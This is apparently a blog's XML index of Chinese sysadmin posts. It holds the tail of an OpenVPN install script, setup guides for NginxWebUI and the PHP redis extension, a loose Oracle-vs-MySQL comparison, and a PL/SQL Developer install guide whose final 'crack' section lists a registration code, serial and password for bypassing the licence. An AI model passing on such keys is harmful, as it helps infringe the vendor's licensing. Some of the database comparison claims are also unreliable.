-n "$client_number"p)</span><br><span class="line">			echo</span><br><span class="line">			read -p "Confirm $client revocation? [y/N]: " revoke</span><br><span class="line">			until [[ "$revoke" =~ ^[yYnN]*$ ]]; do</span><br><span class="line">				echo "$revoke: invalid selection."</span><br><span class="line">				read -p "Confirm $client revocation? [y/N]: " revoke</span><br><span class="line">			done</span><br><span class="line">			if [[ "$revoke" =~ ^[yY]$ ]]; then</span><br><span class="line">				cd /etc/openvpn/server/easy-rsa/</span><br><span class="line">				./easyrsa --batch revoke "$client"</span><br><span class="line">				EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl</span><br><span class="line">				rm -f /etc/openvpn/server/crl.pem</span><br><span class="line">				cp /etc/openvpn/server/easy-rsa/pki/crl.pem /etc/openvpn/server/crl.pem</span><br><span class="line">				# CRL is read with each client connection, when OpenVPN is dropped to nobody</span><br><span class="line">				chown nobody:"$group_name" /etc/openvpn/server/crl.pem</span><br><span class="line">				echo</span><br><span class="line">				echo "$client revoked!"</span><br><span class="line">			else</span><br><span class="line">				echo</span><br><span class="line">				echo "$client revocation aborted!"</span><br><span class="line">			fi</span><br><span class="line">			exit</span><br><span class="line">		;;</span><br><span class="line">		3)</span><br><span class="line">			echo</span><br><span class="line">			read -p "Confirm OpenVPN removal? [y/N]: " remove</span><br><span class="line">			until [[ "$remove" =~ ^[yYnN]*$ ]]; do</span><br><span class="line">				echo "$remove: invalid selection."</span><br><span class="line">				read -p "Confirm OpenVPN removal? [y/N]: " remove</span><br><span class="line">			done</span><br><span class="line">			if [[ "$remove" =~ ^[yY]$ ]]; then</span><br><span class="line">				port=$(grep '^port ' /etc/openvpn/server/server.conf | cut -d " " -f 2)</span><br><span class="line">				protocol=$(grep '^proto ' /etc/openvpn/server/server.conf | cut -d " " -f 2)</span><br><span class="line">				if systemctl is-active --quiet firewalld.service; then</span><br><span class="line">					ip=$(firewall-cmd --direct --get-rules ipv4 nat POSTROUTING | grep '\-s 10.8.0.0/24 '"'"'!'"'"' -d 10.8.0.0/24' | grep -oE '[^ ]+$')</span><br><span class="line">					# Using both permanent and not permanent rules to avoid a firewalld reload.</span><br><span class="line">					firewall-cmd --remove-port="$port"/"$protocol"</span><br><span class="line">					firewall-cmd --zone=trusted --remove-source=10.8.0.0/24</span><br><span class="line">					firewall-cmd --permanent --remove-port="$port"/"$protocol"</span><br><span class="line">					firewall-cmd --permanent --zone=trusted --remove-source=10.8.0.0/24</span><br><span class="line">					firewall-cmd --direct --remove-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"</span><br><span class="line">					firewall-cmd --permanent --direct --remove-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"</span><br><span class="line">					if grep -qs "server-ipv6" /etc/openvpn/server/server.conf; then</span><br><span class="line">						ip6=$(firewall-cmd --direct --get-rules ipv6 nat POSTROUTING | grep '\-s fddd:1194:1194:1194::/64 '"'"'!'"'"' -d fddd:1194:1194:1194::/64' | grep -oE '[^ ]+$')</span><br><span class="line">						firewall-cmd --zone=trusted --remove-source=fddd:1194:1194:1194::/64</span><br><span class="line">						firewall-cmd --permanent --zone=trusted --remove-source=fddd:1194:1194:1194::/64</span><br><span class="line">						firewall-cmd --direct --remove-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"</span><br><span class="line">						firewall-cmd --permanent --direct --remove-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"</span><br><span class="line">					fi</span><br><span class="line">				else</span><br><span class="line">					systemctl disable --now openvpn-iptables.service</span><br><span class="line">					rm -f /etc/systemd/system/openvpn-iptables.service</span><br><span class="line">				fi</span><br><span class="line">				if sestatus 2&gt;/dev/null | grep "Current mode" | grep -q "enforcing" &amp;&amp; [[ "$port" != 1194 ]]; then</span><br><span class="line">					semanage port -d -t openvpn_port_t -p "$protocol" "$port"</span><br><span class="line">				fi</span><br><span class="line">				systemctl disable --now openvpn-server@server.service</span><br><span class="line">				rm -rf /etc/openvpn/server</span><br><span class="line">				rm -f /etc/systemd/system/openvpn-server@server.service.d/disable-limitnproc.conf</span><br><span class="line">				rm -f /etc/sysctl.d/30-openvpn-forward.conf</span><br><span class="line">				if [[ "$os" = "debian" || "$os" = "ubuntu" ]]; then</span><br><span class="line">					apt-get remove --purge -y openvpn</span><br><span class="line">				else</span><br><span class="line">					# Else, OS must be CentOS or Fedora</span><br><span class="line">					yum remove -y openvpn</span><br><span class="line">				fi</span><br><span class="line">				echo</span><br><span class="line">				echo "OpenVPN removed!"</span><br><span class="line">			else</span><br><span class="line">				echo</span><br><span class="line">				echo "OpenVPN removal aborted!"</span><br><span class="line">			fi</span><br><span class="line">			exit</span><br><span class="line">		;;</span><br><span class="line">		4)</span><br><span class="line">			exit</span><br><span class="line">		;;</span><br><span class="line">	esac</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>OpenVPN</category>
      </categories>
      <tags>
        <tag>Shell脚本</tag>
        <tag>OpenVPN</tag>
      </tags>
  </entry>
  <entry>
    <title>NginxWebUI-强大的nginx可视化配置工具</title>
    <url>/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="NginxWebUI-强大的nginx可视化配置工具"><a href="#NginxWebUI-强大的nginx可视化配置工具" class="headerlink" title="NginxWebUI-强大的nginx可视化配置工具"></a>NginxWebUI-强大的nginx可视化配置工具</h1><h2 id="功能说明"><a href="#功能说明" class="headerlink" title="功能说明"></a>功能说明</h2><p>本项目可以使用WebUI配置nginx的各项功能, 包括http协议转发, tcp协议转发, 反向代理, 负载均衡, ssl证书自动申请、续签、配置等, 最终生成nginx.conf文件并覆盖nginx的默认配置文件, 完成nginx的最终功能配置.</p>
<p>本项目可管理多个nginx服务器集群, 随时一键切换到对应服务器上进行nginx配置, 也可以一键将某台服务器配置同步到其他服务器, 方便集群管理</p>
<p>nginx本身功能复杂, 本项目并不能涵盖nginx所有功能, 只能配置常用功能, 更高级的功能配置仍然需要在最终生成的nginx.conf中进行手动编写。</p>
<p>部署此项目后, 配置nginx再也不用上网各种搜索, 再也不用手动申请和配置ssl证书, 只需要在本项目中进行增删改查就可方便的配置nginx。</p>
<h2 id="技术说明"><a href="#技术说明" class="headerlink" title="技术说明"></a>技术说明</h2><p>本项目是基于springBoot的web系统, 数据库使用sqlite, 因此服务器上不需要安装任何数据库</p>
<p>本系统通过Let’s encrypt申请证书, 使用acme.sh脚本进行自动化申请和续签, 开启续签的证书将在每天凌晨2点进行续签, 只有超过60天的证书才会进行续签. 只支持在linux下签发证书.</p>
<p>添加tcp/ip转发配置支持时, 一些低版本的nginx可能需要重新编译，通过添加–with-stream参数指定安装stream模块才能使用, 但在ubuntu 18.04下, 官方软件库中的nginx已经带有stream模块, 不需要重新编译. 本系统如果配置了tcp转发项的话, 会自动引入ngx_stream_module.so的配置项, 如果没有开启则不引入, 最大限度优化ngnix配置文件.</p>
<h2 id="jar安装说明"><a href="#jar安装说明" class="headerlink" title="jar安装说明"></a>jar安装说明</h2><p>以Ubuntu操作系统为例</p>
<p>注意：本项目需要在root用户下运行系统命令，极容易被黑客利用，请一定修改密码为复杂密码</p>
<p>1.安装java运行环境和nginx</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-8-jdk</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>

<p>2.下载最新版发行包jar</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo wget http://www.nginxwebui.cn/download/nginxWebUI-1.9.8.jar</span><br></pre></td></tr></table></figure>

<p>有新版本只需要修改路径中的版本即可</p>
<p>3.启动程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nohup java -jar -Xmx64m nginxWebUI-1.9.8.jar --server.port=8080 --project.home=/home/nginxWebUI/ &gt; /dev/null &amp;</span><br><span class="line">参数说明(都是非必填)</span><br><span class="line"></span><br><span class="line">-Xmx64m 最大分配内存数</span><br><span class="line"></span><br><span class="line">--server.port 占用端口, 默认以8080端口启动</span><br><span class="line"></span><br><span class="line">--project.home 项目配置文件目录，存放数据库文件，证书文件，日志等, 默认为/home/nginxWebUI/</span><br><span class="line"></span><br><span class="line">注意命令最后加一个&amp;号, 表示项目后台运行</span><br></pre></td></tr></table></figure>

<h2 id="docker安装说明"><a href="#docker安装说明" class="headerlink" title="docker安装说明"></a>docker安装说明</h2><p>本项目制作了docker镜像, 同时包含nginx和nginxWebUI在内, 一体化管理与运行nginx.</p>
<p>1.安装docker容器环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure>

<p>2.下载镜像:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/cym1102/nginxwebui:1.9.8</span><br></pre></td></tr></table></figure>

<p>启动容器:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd -v /home/nginxWebUI:/home/nginxWebUI -e BOOT_OPTIONS="--server.port=8080" --privileged=true --net=host registry.cn-hangzhou.aliyuncs.com/cym1102/nginxwebui:1.9.8 /bin/bash</span><br></pre></td></tr></table></figure>

<p>注意:</p>
<p>启动容器时请使用–net=host参数, 直接映射本机端口, 因为内部nginx可能使用任意一个端口, 所以必须映射本机所有端口.</p>
<p>容器需要映射路径/home/nginxWebUI:/home/nginxWebUI, 此路径下存放项目所有数据文件, 包括数据库, nginx配置文件, 日志, 证书等, 升级镜像时, 此目录可保证项目数据不丢失. 请注意备份.</p>
<p>-e BOOT_OPTIONS 参数可填充java启动参数, 可以靠此项参数修改端口号, “–server.port 占用端口”, 不填默认以8080端口启动</p>
<p>日志默认存放在/home/nginxWebUI/log/nginxWebUI.log</p>
<h2 id="找回密码"><a href="#找回密码" class="headerlink" title="找回密码"></a>找回密码</h2><p>如果忘记了登录密码，可按如下教程找回密码</p>
<p>1.安装sqlite3命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install sqlite3</span><br></pre></td></tr></table></figure>

<p>2.读取sqlite.db文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlite3 /home/nginxWebUI/sqlite.db</span><br></pre></td></tr></table></figure>

<p>3.查找admin表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from admin;</span><br></pre></td></tr></table></figure>

<p>4.退出sqlite3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>



<h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p>打开 <a href="http://www.nginxwebui.cn/news.html#" target="_blank" rel="noopener">http://xxx.xx.xxx.xxx:8080</a> 进入主页</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182549224.png" alt="image-20200910182549224"></p>
<p>登录页面, 第一次打开会要求初始化管理员账号</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182605529.png" alt="image-20200910182605529"></p>
<p>进入系统后, 可在管理员管理里面添加修改管理员账号</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182618507.png" alt="image-20200910182618507"></p>
<p>在http参数配置中可以配置nginx的http项目,进行http转发, 默认会给出几个常用配置, 其他需要的配置可自由增删改查. 可以勾选开启日志跟踪, 生成日志跟踪配置项, 每天0点时刻可生成上一天的日志分析报告. 由于日志文件access.log文件过大, 默认只保留7天的log文件, 但分析报告可一直保留。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182640546.png" alt="image-20200910182640546"></p>
<p>TCP参数配置中可以配置nginx的steam项目参数, 进行tcp转发</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182655880.png" alt="image-20200910182655880"></p>
<p>在反向代理中可配置nginx的反向代理即server项功能, 可开启ssl功能, 可以直接从网页上上传pem文件和key文件, 或者使用系统内申请的证书, 可以直接开启http转跳https功能，也可开启http2协议</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182710273.png" alt="image-20200910182710273"></p>
<p>在负载均衡中可配置nginx的负载均衡即upstream项功能, 在反向代理管理中可选择代理目标为配置好的负载均衡</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182723222.png" alt="image-20200910182723222"></p>
<p>在证书管理中可添加证书, 并进行签发和续签, 开启定时续签后, 系统会自动续签即将过期的证书</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182737192.png" alt="image-20200910182737192"></p>
<p>备份文件管理, 这里可以看到nginx.cnf的备份历史版本, nginx出现错误时可以选择回滚到某一个历史版本</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182754266.png" alt="image-20200910182754266"></p>
<p>最终生成conf文件,可在此进行进一步手动修改,确认修改无误后,可覆盖本机conf文件,并进行效验和重启, 可以选择生成单一nginx.conf文件还是按域名将各个配置文件分开放在conf.d下</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182807766.png" alt="image-20200910182807766"></p>
<p>log管理, 在http配置中如果开启了log监控的话, 会每天在这里生成日志分析报告</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/10/NginxWebUI-%E5%BC%BA%E5%A4%A7%E7%9A%84nginx%E5%8F%AF%E8%A7%86%E5%8C%96%E9%85%8D%E7%BD%AE%E5%B7%A5%E5%85%B7/image-20200910182823333.png" alt="image-20200910182823333"></p>
<p>远程服务器管理, 如果有多台nginx服务器, 可以都部署上nginxWebUI, 然后登录其中一台, 在远程管理中添加其他服务器的ip和用户名密码, 就可以在一台机器上管理所有的nginx服务器了</p>
<p>提供一键同步功能, 可以将某一台服务器的数据配置和证书文件同步到其他服务器中</p>
]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>webui</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP安装redis的模块</title>
    <url>/2018/12/03/PHP%E5%AE%89%E8%A3%85redis%E7%9A%84%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP安装redis的模块"><a href="#PHP安装redis的模块" class="headerlink" title="PHP安装redis的模块"></a>PHP安装redis的模块</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.安装php7.0</span><br><span class="line">[root@redis ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpm</span><br><span class="line">[root@redis ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class="line">[root@redis ~]# yum install php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64 php70w-mysql.x86_64 php70w-pdo.x86_64 php70w-devel zlib-devel  -y</span><br><span class="line">[root@redis ~]# yum -y install php70w-fpm</span><br><span class="line">[root@redis ~]# yum install -y make gcc zlib-devel libmemcached-devel gi</span><br><span class="line">=================================================================================</span><br><span class="line">[root@redis ~]# wget https://pecl.php.net/get/redis-4.0.0RC2.tgz #下载扩展</span><br><span class="line">[root@redis ~]# tar xzf redis-4.0.0RC2.tgz</span><br><span class="line">[root@redis ~]# cd redis-4.0.0RC2</span><br><span class="line">[root@redis redis-4.0.0RC2]# /usr/bin/phpize   #---生成./configure 这个配置文件</span><br><span class="line">[root@redis redis-4.0.0RC2]# ./configure -with-php-config=/usr/bin/php-config</span><br><span class="line">...</span><br><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating config.h</span><br><span class="line">config.status: executing libtool commands</span><br><span class="line">[root@ansible-web3 redis-4.0.0RC2]# make &amp;&amp; make install  #编译，最后显示如下表示成功</span><br><span class="line">Build complete.</span><br><span class="line">Don't forget to run 'make test'.</span><br><span class="line">Installing shared extensions:     /usr/lib64/php/modules/</span><br><span class="line">=======================================</span><br><span class="line">[root@redis ~]# vim /etc/php.ini #添加扩展</span><br><span class="line">搜索: \.so</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/03/PHP%E5%AE%89%E8%A3%85redis%E7%9A%84%E6%A8%A1%E5%9D%97/image-20200817205854205.png" alt="image-20200817205854205"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2.安装nginx，配置nginx的yum源--略</span><br><span class="line">配置nginx连接php</span><br><span class="line">[root@redis ~]# vi /etc/nginx/conf.d/nginx.conf</span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           /usr/share/nginx/html;</span><br><span class="line">        fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">编辑php页面</span><br><span class="line">[root@redis ~]# cd /usr/share/nginx/html/</span><br><span class="line">[root@redis html]# vi index.php</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">启动nginx与php</span><br><span class="line">[root@redis ~]# systemctl start nginx</span><br><span class="line">[root@redis ~]# systemctl start php-fpm</span><br></pre></td></tr></table></figure>

<p>访问：</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/03/PHP%E5%AE%89%E8%A3%85redis%E7%9A%84%E6%A8%A1%E5%9D%97/image-20200817205923023.png" alt="image-20200817205923023"></p>
<p>安装扩展完成！</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle和mysql区别</title>
    <url>/2020/08/17/Oracle%E5%92%8Cmysql%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Oracle和mysql区别"><a href="#Oracle和mysql区别" class="headerlink" title="Oracle和mysql区别"></a>Oracle和mysql区别</h1><p>1、本质的区别。oracle是对象关系数据库管理系统，简称ordbms。mysql是开源关系数据库关系系统，简称rdbms。Oracle是收费的。mysql是开源、免费的。<br>2、数据库安全性。myql就账号/密码/location等。oracle可以从账号密码，本地账户。指定账户，配置文件，外部身份验证。高级安全验证等。<br>3、语法不同。oracle被称为pl-sql语言，而且强大的pl-sql工具，具有强大的功能，用于生成报表输出。<br>4、database不同。mysql没有快照、角色定义、表空间以及自动存储管理。<br>5、区分大小写。oracle和mysql虽然本质上不缺分大小写，但在有些时候区分大小写，比如mysql的数据库名和表，具体还要看底层操作系统。<br>6、编程语言不同。oracle支持多种编程语言，可以直接在内部编写代码，此外为了传输oracle可以用xml格式。<br>mysql不支持系统内部语言，也不支持xml传输。<br>7、mysql和oracle支持的字符格式区别。mysql支持 char（255）和varchar（65535）字符，<br>oracle支持char(2000)、nchar(2000),varchar2(4000),nvarchar2(4000)，<br>8、mysql不支持扩展程序，oracle支持扩展中程序，比如active vault、GUARD。<br>9、临时表不同存储。mysql仅对当前可用的数据库，一旦会话结束，临时表也查询不到。<br>10、备份不同，oracle备份用rman备份程序极少的命令备份和恢复数据源，<br>11、数据库的管理。oracle dba具有很多可用的地方。<br>12、数据库认证，mysql比oracle更方便，mysql可以直接更具location指定对应ip进行访问对应db。</p>
]]></content>
      <categories>
        <category>oracle</category>
      </categories>
      <tags>
        <tag>oracle</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>PLSQ安装、汉化、破解、登陆教程</title>
    <url>/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PLSQ安装、汉化、破解、登陆教程"><a href="#PLSQ安装、汉化、破解、登陆教程" class="headerlink" title="PLSQ安装、汉化、破解、登陆教程"></a>PLSQ安装、汉化、破解、登陆教程</h1><h2 id="1-PLSQL安装"><a href="#1-PLSQL安装" class="headerlink" title="1.PLSQL安装"></a>1.PLSQL安装</h2><p>双击打开“plsqldev1207x64.msi”，然后依次进行安装</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908093540914.png" alt="image-20200908093540914"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908093558495.png" alt="image-20200908093558495"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908093640865.png" alt="image-20200908093640865"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908093653447.png" alt="image-20200908093653447"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908093707726.png" alt="image-20200908093707726"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908093736537.png" alt="image-20200908093736537"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908093746576.png" alt="image-20200908093746576"></p>
<h2 id="2-PLSQL汉化"><a href="#2-PLSQL汉化" class="headerlink" title="2.PLSQL汉化"></a>2.PLSQL汉化</h2><p>右键单击“PLSQL Developer 12 (64 bit)”的图标</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908093854548.png" alt="image-20200908093854548"></p>
<p>然后选择”打开文件位置“</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908094047734.png" alt="image-20200908094047734"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908094119878.png" alt="image-20200908094119878"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908094239499.png" alt="image-20200908094239499"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908094300542.png" alt="image-20200908094300542"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908094313213.png" alt="image-20200908094313213"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908094331140.png" alt="image-20200908094331140"></p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908094351655.png" alt="image-20200908094351655"></p>
<p>这样，汉化就已经完成了</p>
<h2 id="3-PLSQL破解"><a href="#3-PLSQL破解" class="headerlink" title="3.PLSQL破解"></a>3.PLSQL破解</h2><p>双击运行”PLSQL Developer 12 (64 bit)”</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908094517054.png" alt="image-20200908094517054"></p>
<p>然后点击“帮助”，“注册”，会弹出如下界面</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/07/PLSQ%E5%AE%89%E8%A3%85%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E7%A0%B4%E8%A7%A3%E3%80%81%E7%99%BB%E9%99%86%E6%95%99%E7%A8%8B/image-20200908095015891.png" alt="image-20200908095015891"></p>
<p>依次填入如下三行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4vkjwhfeh3ufnqnmpr9brvcuyujrx3n3le </span><br><span class="line">226959</span><br><span class="line">xs374ca</span><br></pre></td></tr></table></figure>

<p>然后点击“注册”，得到如下回显，即可表明破解成功</p>
